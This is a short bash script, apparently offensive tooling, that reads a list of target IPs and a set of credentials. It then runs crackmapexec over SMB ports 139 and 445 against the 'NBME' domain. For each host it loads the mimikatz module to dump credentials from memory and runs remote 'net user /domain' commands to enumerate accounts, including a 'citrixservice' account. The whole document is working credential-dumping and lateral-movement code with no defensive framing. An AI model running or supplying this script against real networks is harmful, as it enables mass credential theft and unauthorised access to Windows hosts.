declare -a PORT=(139 445)

echo "What is the target list?"
read targets
echo "what is the username?"
read usrname
echo "what is the password?"
read psswrd

for IP in $(cat $targets);do
	for PORTNUM in ${PORT[*]};do
		crackmapexec -t 20 $IP -d NBME -u $usrname -p $psswrd --smb-port $PORTNUM -M mimikatz
		crackmapexec -t 20 $IP -d NBME -u $usrname -p $psswrd --smb-port $PORTNUM -x 'net user "$usrname" /domain'
		crackmapexec -t 20 $IP -d NBME -u $usrname -p $psswrd --smb-port $PORTNUM -x 'net user "citrixservice" /domain'	
	done
done

unset targets
unset usrname
unset psswrd
unset PORT
unset PORTNUM
set -u
